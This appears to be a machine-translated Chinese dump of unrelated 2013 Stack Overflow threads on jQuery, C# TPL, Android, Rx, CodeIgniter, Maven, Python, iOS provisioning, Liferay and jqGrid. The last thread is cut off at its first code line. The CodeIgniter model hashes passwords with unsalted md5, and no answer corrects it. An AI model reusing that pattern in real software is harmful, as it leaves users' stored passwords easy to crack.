# javascript - 使用 jQuery 和 Ajax 的 Twitter 搜索 API - 如何在我的演示没有结果时检索数据

> ID：15879217
> 
> 赞同：1
> 
> 时间：2013-04-08T12:37:54.703
> 
> 标签：javascript, jquery, ajax, twitter

我正在尝试添加基于各种主题的推特搜索时间线，例如搜索不同节日的所有最新推文。我找到了一个关于如何使用带有 Jquery 和 Ajax 的 twitter API 对不同推文进行一般搜索的教程，但是在我可以进一步前进之前，当我在浏览器中运行网页并尝试不同时，我没有得到任何结果显示搜索主题。该代码类似于教程，我仍在学习不同的 twitter API 来帮助我完成我的项目，但我认为我仍然感到困惑。请有人可以看看我的代码并告诉我我做错了什么。这是一个 JSFiddle 来演示我的问题：http: [//jsfiddle.net/YSBtC/](http://jsfiddle.net/YSBtC/)这是 javascript 代码的主要来源

```
$(document).ready(function(){
        $('#search').click(function(){
            $('#results').html('');
            console.log($('#i').val());
            var search_term = $('#i').val();
            $.ajax({
                type: 'GET',
                dataType: 'jsonp',
                url: 'http://search.twitter.com/search.json',
                data:{q: search_term},
                success: function(data){
                    $.each(data.results, function(index, tweet){
                        $tweets = $(".tweet").first().clone();
                        console.log(tweet);
                        $tweets.find('.img').attr('src', tweet.profile_image_url)
                        $tweets.find('.name').text(tweet.from_user_name);
                        $tweets.find('.handle').html(twttr.txt.autoLink("@"+tweet.from_user));
                        $tweets.find('.text').html(twttr.txt.autoLink(tweet.text));
                        $tweets.hide().appendTo('#results').delay(400).fadeIn();
                    });
                }
            });
        });
    }); 
```

我将衷心感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-19T10:47:40.070

您的代码中的 url 在 Twitter API 中已被弃用。

正确的 url 是[https://api.twitter.com/1.1/search/tweets.json](https://api.twitter.com/1.1/search/tweets.json)但需要经过适当的身份验证。有关更多信息，请参阅 API 文档[https://dev.twitter.com/docs/api/1.1/get/search/tweets](https://dev.twitter.com/docs/api/1.1/get/search/tweets)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:45:45.700

那是因为 JavaScript 在以下几行崩溃：

```
$tweets.find('.handle').html(twttr.txt.autoLink("@"+tweet.from_user));
$tweets.find('.text').html(twttr.txt.autoLink(tweet.text)); 
```

您正在尝试访问`twttr`不存在的名为的变量（至少，不在您发布的代码中）。这就是`#results`div 为空的原因。

删除这些行（或正确初始化这些变量）将解决您的问题。

看到这个小提琴：http: [//jsfiddle.net/YSBtC/1/](http://jsfiddle.net/YSBtC/1/)

# c# - 任务具有计时器已用事件时的任务状态

> ID：15879218
> 
> 赞同：0
> 
> 时间：2013-04-08T12:37:55.620
> 
> 标签：c#, .net, task-parallel-library

我正在使用 TPL 创建并行任务。每个任务都有计时器经过事件，因此每 2 秒它调用另一个方法。这将持续很长时间。但是，当调用计时器事件时的状态时，任务状态为“RanToCompletion”。当任务每隔几秒钟调用一次事件计时器时，任务怎么会是这种状态？示例代码如下。

```
Task<int>[] tasks = new Task<int>[n];
for (int i = 0; i < 20; i++)
{
    tasks[i] = Task<int>.Factory.StartNew(() =>
    {
        Work work = new Work();
        work.doWork();
        return 1;
    }
    );
}

public void doWork()
{
        System.Timers.Timer aTimer = new System.Timers.Timer(1000);
        aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
        aTimer.Start()
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:49:28.963

每个任务主体只创建一个计时器，因此当您点击返回时任务完成。计时器不会阻止任务。

任务完成有问题吗？如果是这样，您能否详细说明原因？

FWIW，Task 通常非常适合单个未来值。如果您希望每 X 秒发生一次，要么直接创建/使用计时器（不需要任务），要么考虑使用 Observable.Interval 之类的东西每 X 秒获取一个持续的值流。

# android - 未检测到文档 6 的语法约束（DTD 或 XML 模式）

> ID：15879222
> 
> 赞同：1
> 
> 时间：2013-04-08T12:38:11.900
> 
> 标签：android, xml, constraints

我正在我的体育馆里参加 C 编程考试。每次我单击“krypter”或“dekrypter”（它们是两个按钮）时，我的应用程序都会崩溃。我在代码中的一些不同位置收到上述错误，无法弄清楚问题所在。我已经看过许多其他类似的问题，但没有一个让我看到问题所在。这两个活动大部分是相同的，并且对于 XML 是相同的。

您可以从我的主要活动中打开的一项活动的代码

```
public class Krypteringstype extends Activity {

public Button slider;
public Button krypterKnap;
public EditText tekst;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.krypteringstype);                               // viser krypteringssiden
    slider = (Button) findViewById(R.id.handle);                            // forbinder xml-knappen og knappen "slider", som er defineret tidligere
    slider.getBackground().setAlpha(230);                                   // gør baggrunden, som jeg bruger let transparent
    //tekst = (EditText) findViewById(editText1);
    krypterKnap = (Button) findViewById(R.id.krypter);
    krypterKnap.setOnClickListener(new Button.OnClickListener() {
        public void onClick(View v) {
            krypterKnap();
        }
    });
}

private void krypterKnap() {
    if (tekst.getText().equals("")){
        Toast.makeText(getApplicationContext(), "Skriv tekst først", Toast.LENGTH_LONG).show();
    }
    else {
        konverter();
    }   
}

private void konverter(){
    String initialString = "yourString";
    char[] chars = initialString.toCharArray();
    for (int i = 0; i < chars.length; ++i)
        chars[i] = (char)((int)chars[i] + 2);
//  String resultString = new String(chars);
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.krypter, menu);
    return true;
}

} 
```

上述活动的 XML

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:background="@drawable/blue_binary_code_1600_1200"
tools:context=".Krypter" >

<Button
    android:id="@+id/krypter"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_alignParentLeft="true"
    android:layout_marginBottom="15dp"
    android:layout_marginLeft="30dp"
    android:background="@drawable/background_large"
    android:gravity="center"
    android:minHeight="35dp"
    android:minWidth="100dp"
    android:text="@string/valg"
    android:textSize="20sp" />

<Button
    android:id="@+id/standardKrypter"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_alignParentRight="true"
    android:layout_marginBottom="15dp"
    android:layout_marginRight="30dp"
    android:background="@drawable/background_large"
    android:gravity="center"
    android:minHeight="35dp"
    android:minWidth="100dp"
    android:text="@string/standard"
    android:textSize="20sp" />

<Button
    android:id="@+id/overskriftKrypter"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentTop="true"
    android:layout_centerHorizontal="true"
    android:layout_marginTop="15dp"
    android:background="@drawable/background_large"
    android:minHeight="35dp"
    android:minWidth="250dp"
    android:text="@string/overskrift"
    android:textSize="20sp" />

<LinearLayout
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_above="@+id/krypter"
    android:layout_alignParentLeft="true"
    android:layout_alignParentRight="true"
    android:layout_below="@+id/overskriftKrypter"
    android:layout_marginBottom="15dp"
    android:layout_marginTop="15dp" >

    <SlidingDrawer
        android:id="@+id/slidingDrawerKrypter"
        android:layout_width="fill_parent"
        android:layout_height="match_parent"
        android:layout_weight="1"
        android:content="@+id/content"
        android:handle="@+id/handle" >

        <Button
            android:id="@+id/handle"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/background_large"
            android:minHeight="35dp"
            android:text="@string/ceasar" />

        <LinearLayout
            android:id="@+id/content"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:background="@drawable/button_background" >

            <EditText
                android:id="@+id/editText1"
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:hint="@string/ceasarNr"
                android:inputType="number" >

                <requestFocus />
            </EditText>
        </LinearLayout>
    </SlidingDrawer>

    <SlidingDrawer
        android:id="@+id/slidingDrawer2"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_weight="1"
        android:content="@+id/content"
        android:handle="@+id/handle" >

        <Button
            android:id="@+id/handle2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/background_large"
            android:minHeight="35dp"
            android:text="@string/abe" />

        <LinearLayout
            android:id="@+id/content2"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:background="@drawable/button_background"
            android:orientation="vertical" >

            <EditText
                android:id="@+id/editText2"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/a"
                android:inputType="number" />

            <EditText
                android:id="@+id/editText4"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/b"
                android:inputType="number" />

            <EditText
                android:id="@+id/editText3"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/e"
                android:inputType="number" />
        </LinearLayout>
    </SlidingDrawer>

    <SlidingDrawer
        android:id="@+id/slidingDrawer3"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_weight="1"
        android:content="@+id/content"
        android:handle="@+id/handle" >

        <Button
            android:id="@+id/handle3"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/background_large"
            android:minHeight="35dp"
            android:text="@string/rsa" />

        <LinearLayout
            android:id="@+id/content3"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:background="@drawable/button_background"
            android:orientation="vertical" >

            <EditText
                android:id="@+id/editText5"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/prim1"
                android:inputType="number" />

            <EditText
                android:id="@+id/editText7"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/prim2"
                android:inputType="number" />

            <EditText
                android:id="@+id/editText6"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/k"
                android:inputType="number" />

        </LinearLayout>
    </SlidingDrawer>
</LinearLayout> 
```

您可以从我的主要活动中打开的第二个活动的代码

```
public class Dekrypteringstype extends Activity {

public Button slider;
public Button krypterKnap;
public EditText tekst;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.dekrypteringstype);                             // viser krypteringssiden
    slider = (Button) findViewById(R.id.handle);                            // forbinder xml-knappen og knappen "slider", som er defineret tidligere
    slider.getBackground().setAlpha(230);                                   // gør baggrunden, som jeg bruger let transparent
    //tekst = (EditText) findViewById(editText1);
    krypterKnap = (Button) findViewById(R.id.dekrypter);
    krypterKnap.setOnClickListener(new Button.OnClickListener() {
        public void onClick(View v) {
            krypterKnap();
        }
    });
}

private void krypterKnap() {
    if (tekst.getText().equals("")){
        Toast.makeText(getApplicationContext(), "Skriv tekst først", Toast.LENGTH_LONG).show();
    }
    else {
        konverter();
    }   
}

private void konverter(){
    String initialString = "yourString";
    char[] chars = initialString.toCharArray();
    for (int i = 0; i < chars.length; ++i)
        chars[i] = (char)((int)chars[i] + 2);
//  String resultString = new String(chars);
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.dekrypter, menu);
    return true;
} 
```

}

上述活动的 XML

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:background="@drawable/blue_binary_code_1600_1200"
tools:context=".Dekrypter" >

<Button
    android:id="@+id/dekrypter"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_alignParentLeft="true"
    android:layout_marginBottom="15dp"
    android:layout_marginLeft="30dp"
    android:background="@drawable/background_large"
    android:gravity="center"
    android:minHeight="35dp"
    android:minWidth="100dp"
    android:text="@string/valg"
    android:textSize="20sp" />

<Button
    android:id="@+id/standardDekrypter"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_alignParentRight="true"
    android:layout_marginBottom="15dp"
    android:layout_marginRight="30dp"
    android:background="@drawable/background_large"
    android:gravity="center"
    android:minHeight="35dp"
    android:minWidth="100dp"
    android:text="@string/standard"
    android:textSize="20sp" />

<Button
    android:id="@+id/overskriftDekrypter"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentTop="true"
    android:layout_centerHorizontal="true"
    android:layout_marginTop="15dp"
    android:background="@drawable/background_large"
    android:minHeight="35dp"
    android:minWidth="250dp"
    android:text="@string/overskrift2"
    android:textSize="20sp" />

<LinearLayout
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_above="@+id/dekrypter"
    android:layout_alignParentLeft="true"
    android:layout_alignParentRight="true"
    android:layout_below="@+id/overskriftDekrypter"
    android:layout_marginBottom="15dp"
    android:layout_marginTop="15dp" >

    <SlidingDrawer
        android:id="@+id/slidingDrawerDekrypter"
        android:layout_width="fill_parent"
        android:layout_height="match_parent"
        android:layout_weight="1"
        android:content="@+id/content"
        android:handle="@+id/handle" >

        <Button
            android:id="@+id/handle"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/background_large"
            android:minHeight="35dp"
            android:text="@string/ceasar" />

        <LinearLayout
            android:id="@+id/content"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:background="@drawable/button_background" >

            <EditText
                android:id="@+id/editText1"
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:hint="@string/ceasarNr"
                android:inputType="number" >

                <requestFocus />
            </EditText>
        </LinearLayout>
    </SlidingDrawer>

    <SlidingDrawer
        android:id="@+id/slidingDrawer2"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_weight="1"
        android:content="@+id/content"
        android:handle="@+id/handle" >

        <Button
            android:id="@+id/handle2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/background_large"
            android:minHeight="35dp"
            android:text="@string/abe" />

        <LinearLayout
            android:id="@+id/content2"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:background="@drawable/button_background"
            android:orientation="vertical" >

            <EditText
                android:id="@+id/editText2"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/a"
                android:inputType="number" />

            <EditText
                android:id="@+id/editText4"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/b"
                android:inputType="number" />

            <EditText
                android:id="@+id/editText3"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/e"
                android:inputType="number" />
        </LinearLayout>
    </SlidingDrawer>

    <SlidingDrawer
        android:id="@+id/slidingDrawer3"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_weight="1"
        android:content="@+id/content"
        android:handle="@+id/handle" >

        <Button
            android:id="@+id/handle3"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/background_large"
            android:minHeight="35dp"
            android:text="@string/rsa" />

        <LinearLayout
            android:id="@+id/content3"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:background="@drawable/button_background"
            android:orientation="vertical" >

            <EditText
                android:id="@+id/editText5"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/prim1"
                android:inputType="number" />

            <EditText
                android:id="@+id/editText7"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/prim2"
                android:inputType="number" />

            <EditText
                android:id="@+id/editText6"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:hint="@string/k"
                android:inputType="number" />

        </LinearLayout>
    </SlidingDrawer>
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-06T13:47:35.857

您取消了获取`tekst`输入的代码的注释，因此当您尝试使用该`tekst`变量进行任何操作时，您的应用程序将崩溃

> //tekst = (EditText) findViewById(editText1);

这发生在这里：

```
...snip
 private void krypterKnap() {
        if (tekst.getText().equals("")){
...snip 
```

所以，取消注释`tekst = (EditText) findViewById(editText1);`，你应该没问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-29T04:38:19.577

```
I got the solution by following steps: 
```

1.  转到 Windows-> 首选项-> XML-> XML 文件
2.  在 Validation files 部分中，选择 Ignore in No grammar is specified, default is Warning
3.  申请并确定。验证后清理所有项目并享受:)

# c# - 为什么不能 IObservable 不使用 .NET 的 Reactive(Rx) 扩展名？

> ID：15879225
> 
> 赞同：5
> 
> 时间：2013-04-08T12:38:17.523
> 
> 标签：c#, .net, task-parallel-library, system.reactive

试图了解[为什么以及何时需要](https://stackoverflow.com/questions/15876957/a-code-example-illustrating-the-difference-between-the-paradigms-of-async-await)为 .NET 使用 Reactive Extension (Rx)，我开始质疑“ [C# 5.0 async/await feature and Rx - Reactive Extensions](https://stackoverflow.com/questions/4063353/c-sharp-5-0-async-await-feature-and-rx-reactive-extensions) ”，阅读其参考文献导致的问题多于答案.

后一篇文章中提到的[Task vs IObservable：when to use what？](http://blogs.msdn.com/b/flaviencharlon/archive/2012/08/06/task-lt-t-gt-vs-iobservable-lt-t-gt-when-to-use-what.aspx)似乎是指`IObservable`同义词（或可互换地）使用[.NET 的 Reactive (Rx) 扩展](http://msdn.microsoft.com/en-us/library/hh242985%28v=vs.103%29.aspx)

例如，上述文章中的短语是什么意思：

> 如果您选择返回 IObservable，您的代码将需要响应式扩展

想说什么？

两者都是 .NET`Task<T>`的[`IObservable<T>`](http://msdn.microsoft.com/en-us/library/dd990377%28v=vs.100%29.aspx)一部分，我在没有任何 Rx 参考或设置的情况下使用它。
为什么我需要响应式扩展才能 retuen `IObservable`？

`Task<T>`RX 在讨论vs. IObservable时必须做什么？
为什么它们的用法并列？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-08T12:44:46.650

这实际上是由于易于实施。你永远不应该尝试实现`IObservable<T>`自己；Rx 具有您可能需要正确有效地完成的所有实现。

[Rx 设计指南](http://go.microsoft.com/fwlink/?LinkID=205219)指定了`IObservable<T>`. 请注意， [MSDN 示例实现](http://msdn.microsoft.com/en-us/library/dd990377.aspx)是完全错误的。

**更新：**

MSDN 示例代码在以下语义中失败（参考编号是上述文档中的设计指南）：

*   不强制执行 Rx 语法 (4.1)。
*   `OnError`在(4.3)之后不会自动取消订阅。
*   可能无法正确处理角落案例（6.1、6.2）。
*   `OnError`没有中止语义（6.6）。
*   如果一个订阅被释放并且同一个观察者被重新订阅，那么原始订阅不再是幂等的（6.17）。

只有当自定义实现假定所有调用`TrackLocation`都被序列化时。在 Rx 世界中，情况几乎从未如此。

请注意，使用 Rx`Synchronize`运算符可以解决所有这些问题，尽管您仍然必须假设对`TrackLocation`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T15:36:24.790

IObservable 和 IObserver 是由 Rx 团队为 Rx 创建的……他们将其放入 .NET 框架中，这样人们就可以针对该接口进行编程并在他们的库中公开 IObservables，而无需强制每个人自动要求所有 Rx 程序集，但尽快当你想用 IObservable 做一些事情时，你要么必须创建类似 Rx 的类来使用它们，要么使用 Rx。

IObservable 和 IObserver 在数学上与 IEnumerable 和 IEnumerator 是对偶的（“箭头”，参数和返回值流动的方向，以一种巧妙的方式反转）。类似于除了 MoveNext 和 Current 之外你不能对 IEnumerable 做很多事情，并使用包装这些方法（实际上是方法和属性）的 foreach 语句，但是 LINQ 提供了适用于 IE 的各种扩展方法，Rx 提供了 IO 的扩展方法。可以在 BCL 中实现订阅，并且仅此而已，并且可能添加一个类似 foreach 的语句来为您执行此操作，但是您很快就会发现您需要其他东西的实用程序才能真正最大限度地利用IO。

# javascript - 在页面更改后保持选择的下拉列表中的选项

> ID：15879226
> 
> 赞同：4
> 
> 时间：2013-04-08T12:38:18.570
> 
> 标签：javascript, jquery, html, css, responsive-design

所以我建立了我的第一个响应式网站，但移动设备上的菜单存在问题。这一切都有效，因此当您使用移动设备时，您可以从下拉列表（下面的 HTML）中选择一个选项，它会将您带到正确的页面。但是，当页面加载时，它默认返回“主页”，这是列表中的第一个选项。

这意味着您在另一个页面上时无法选择主页。但是我需要的是选择该选项时，并且为选择的一个新页面加载以成为默认选项。因此，您可以使用下拉菜单返回主页。

我以前没有这样做过，所以希望它相当简单！

HTML：

```
 <form id="mobile_nav">
            <select id="mobile_menu">

<option value="/">Home</option>           
<option value="/page 1/">page 1</option>
<option value="/page 2/">page 2</option>
<option value="/page 3/"page 3</option>
<option value="/page 4/"page 4</option>
<option value="/page 5/"page 5</option>

            </select>
 </form> 
```

JS：

```
 jQuery(document).ready(function() {
        nav();

          jQuery("#mobile_menu").val(location.pathname);

        jQuery("#mobile_menu").change(function() {
            document.location = jQuery(this).val();
        }); 
```

JS 在移动设备上启用下拉菜单。

如果您需要更多信息，请告诉我，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:41:31.540

这可能会有所帮助：

```
jQuery(document).ready(function(){
    jQuery("#mobile_menu").val(location.pathname)
}); 
```

这将尝试将值设置为`#mobile_menu`与位置的路径部分（当前 URL）相同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:41:28.890

您可以使用 了解当前 URL `document.URL`。将此 URL 与下拉列表中的值进行比较，您可以在页面加载时选择相应的选项。例如。您可以使用与此类似的方法：

```
var currentURL = document.URL;
if (currentURL.indexOf("home"))
{
   $("#mobile_nav select").val("home");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T12:42:27.770

用于`window.location.href`获取当前位置并选择该位置

```
 jQuery(document).ready(function(){
    jQuery("#mobile_menu").val(window.location.href);
 }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-08T13:07:09.137

我在该领域的知识已经过时，但这可能会带来一些想法（我希望）。

```
<head>
  <script>
    function makeDefault(elm) {
        elm.options[elm.selectedIndex].selected = 'selected';
        alert(elm.innerHTML);
    }
  </script>
</head>
<body>
  <form id="mobile_nav">
    <select id="mobile_menu" onchange="makeDefault(this)">
      <option value="/">Home</option>           
      <option value="/page 1/">page 1</option>
      <option value="/page 2/" selected='selected'>page 2</option>
    </select>
  </form>
</body> 
```

# codeigniter - 尝试将表单数据插入数据库但出错

> ID：15879232
> 
> 赞同：0
> 
> 时间：2013-04-08T12:38:28.090
> 
> 标签：codeigniter

**两个错误**

## 错误 1

```
A PHP Error was encountered

Severity: Notice

Message: Use of undefined constant model_users - assumed 'model_users'

Filename: controllers/main.php

Line Number: 110 
```

## 错误 2

```
A PHP Error was encountered

Severity: Notice

Message: Undefined property: Main::$add_database

Filename: core/Model.php

Line Number: 51 
```

## 控制器

```
if ($this->form_validation->run() == TRUE)
{
    $this->load->model(model_users);          //Line 110
    $this->model_users->add_database;
}else{
    $this->load->view('signup');
} 
```

**模型**

```
public function add_database() {

$usersdata = array (
                'email'     =>  $this->input->post('email'),
                'password'  =>  md5($this->input->post('password')),
);

$regdetails = array (
                'full_name'         =>  $this->input->post('full_name'),
                'gender'            =>  $this->input->post('gender'),
                'dob'               =>  $this->input->post('dob'),
                'address'           =>  $this->input->post('address'),
                'city'              =>  $this->input->post('city'),
                'state'             =>  $this->input->post('state'),
                'country'           =>  $this->input->post('country'),
                'pin'               =>  $this->input->post('zip'),
                'alternative_email' =>  $this->input->post('alt_email'),
                'phone'             =>  $this->input->post('phone'),
                'mobile'            =>  $this->input->post('mobile'),
);

    $query = $this->db->insert('users',$usersdata);
    $this->db->insert('tbl_studentreg',$regdetails);
} 
```

我可以知道如何解决吗？在上面提到的代码中没有未来的错误。提前致谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:45:44.973

您错过了`"`..将您的型号名称作为字符串传递...

```
 $this->load->model("model_users"); 
```

[文档在这里](http://ellislab.com/codeigniter/user-guide/libraries/loader.html)

第二个错误，

您需要添加`()`，因为您正在调用一个名为 add_database 的函数

```
 $this->model_users->add_database(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:04:46.977

您加载模型的语法是错误的。只需将模型的名称指定为字符串，它看起来像这样。

```
$this->load->model("model_users"); 
```

如果再次发生错误，请检查您为模型指定的名称，您的行可能是这样的。

```
class Model_users extends CI_Model{ 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T13:32:58.337

你有没有在 config/autoload.php 中加载数据库库

```
$autoload['libraries'] = array('database'); 
```

# maven - maven：使用两种不同的包装/类型创建相同的工件

> ID：15879234
> 
> 赞同：1
> 
> 时间：2013-04-08T12:38:40.823
> 
> 标签：maven, artifacts

我正在使用 maven 构建用于多语言开发（.net、java、本机 C++）的工件。

我正在使用 npandy 插件、native-maven-plugin 和标准 maven java 插件。

我想创建一些可用于所有这三种语言的通用库工件，例如

*   通用库.dll
*   commonLibrary.lib (赢)
*   commonLibrary.a (unix)
*   commonLibrary.jar

从概念上讲，它是相同的工件，只是具有不同的扩展名，用于不同的语言。我试图使用 Maven 分类器来区分它们。然而，这并不完全奏效。

这些工件类型中的每一个的 pom 文件必须因其打包而不同，因此存在问题。IE

*   dotnet 库
*   库
*   一个
*   罐

有什么想法可以创建具有相同工件 ID 的所有工件吗？

干杯

# python - Python 控制台进度

> ID：15879236
> 
> 赞同：-1
> 
> 时间：2013-04-08T12:38:45.873
> 
> 标签：python, progress

我需要在控制台中创建简单的进度。喜欢：

```
Progress: [######] 30% out of 432 combinations
Last 10 tried:
12.12.2013 - this1
12.12.2013 - this2
...
12.12.2013 - this10 
```

很简单。我发现了一个丑陋的方法：每次都执行 clr() 并打印（用于进度）。但我不明白，我怎样才能用不同的数据打印 10 个字符串。10次​​打印很丑，数据一直在变化。有没有办法很好地登录控制台？对不起我的英语不好。

我的示例代码：

```
import os
import time

def cls():
    os.system(['clear', 'cls'][os.name == 'nt'])

def progress(i, l=None):
    total = 400
    a = 100-i*100/total
    cls()
    print "Progress: [%-33s] %d%% out of %d combinations" % ("#"*(a/3), a, total)
    print "Last 10 tried:"
    for j in l:
        print j
    time.sleep(0.3)

i = 400
l = []
while i > 0:
    l.append("%s - %s" % ('11.21.2013', i))
    if len(l) >= 10:
        progress(i, l)
        l = []
    i -= 1 
```

那是我需要的，但我认为它可以优化。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:42:46.170

我这样做如下

```
print (current_line * 100 // total_lines, "%", end = '\r') 
```

不要忘记，控制台输出过多会减慢您的循环速度。

# ios - 如何将新设备添加到配置文件

> ID：15879245
> 
> 赞同：4
> 
> 时间：2013-04-08T12:39:06.073
> 
> 标签：ios, provisioning-profile

我想编辑分发配置文件，以便添加/删除设备。

基本上，来自 Apple 的以下文档页面向我们展示了如何轻松地做到这一点......但是由于他们更新了门户，我不知道该怎么做......

[http://developer.apple.com/library/ios/#recipes/ProvisioningPortal_Recipes/CreatingaDistributionProvisioningProfile/CreatingaDistributionProvisioningProfile.html#//apple_ref/doc/uid/TP40011211-CH3-SW1](http://developer.apple.com/library/ios/#recipes/ProvisioningPortal_Recipes/CreatingaDistributionProvisioningProfile/CreatingaDistributionProvisioningProfile.html#//apple_ref/doc/uid/TP40011211-CH3-SW1)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T14:28:50.227

我会回答我自己的问题，因为设备列表只出现在开发配置文件中，所以有一个 javascript hack 可以让我们解决分发配置文件的这个问题。

[https://gist.github.com/ashtom/d0aeb62eedbfd555b04e](https://gist.github.com/ashtom/d0aeb62eedbfd555b04e)

编辑：苹果解决了这个问题。现在显示分配配置文件的设备列表。

# cloud - 我们可以让 Liferay 在私有云中动态扩展吗？

> ID：15879247
> 
> 赞同：0
> 
> 时间：2013-04-08T12:39:09.377
> 
> 标签：cloud, liferay, private

我们的数据中心有一些用于虚拟化的 VMware 产品（还不知道细节），并且希望能够在分配给 VM 的资源不足的情况下扩展 Liferay。似乎有以下选项可以做类似的事情。如果有问题或遗漏，请纠正我。

选项1：

Liferay 本身说它可以集群。多个实例将进行通信和同步，以便在用户看来它就像一台服务器。是否可以在不拦截服务的情况下添加/删除此类实例？

选项 2：

扩展底层应用服务器（Tomcat、Glassfish、JBoss，...）似乎更好，但目前我只发现 Redhats OpenShift 可以做到这一点。这将如何集成到私有虚拟化环境中？是否有其他可能性来扩展所述服务器？

其他选项：

我已经阅读了其他一般的云解决方案，例如 Eucalyptus、OpenStack 等，但不知道这些解决方案是否对这里有任何帮助。

任何建议或经验都会很好。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T14:44:44.240

选项 1 有效 - 查看[文档](https://www.liferay.com/documentation/liferay-portal/6.1/user-guide/-/ai/enterprise-configurati-5)以了解如何设置集群。

选项 2 取决于您的环境等，因此我觉得我无法对此给出明确的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-29T14:03:21.457

我已经在 Openstack Cloud 上完成了这项工作

2 Liferay appservers (tomcat) 在 Openstack 提供的负载均衡器后面，VIP 由浮动 IP 分配，并将其用作 Liferay 的入口点。

在 Openstack 提供的负载均衡器后面有 2 个 MySQL 数据库服务器（主+主设置），VIP 就是您在 Liferay 服务器上设置的 MySQL 数据库 IP。

它就像一个魅力。如果您想要一个更具弹性/可靠性的数据库集群，您可以进行 Galera+DB 设置。

# asp.net - JqG rid 编辑表单和分页在表单上不能一起工作

> ID：15879249
> 
> 赞同：0
> 
> 时间：2013-04-08T12:39:21.903
> 
> 标签：asp.net, jqgrid

我使用编辑表单对话框编辑网格。提交按钮后，我需要重新加载网格。我已经设置了 reloadAfterSubmit:true。这在我在网格上设置 mtype="POST" 时有效。提交编辑表单后，网格会立即重新加载。但我无法让寻呼机工作。

当我删除 mtype="POST" 时，寻呼机将工作，但编辑表单不会刷新网格。请给我一些意见。

```
$("#list").jqGrid({
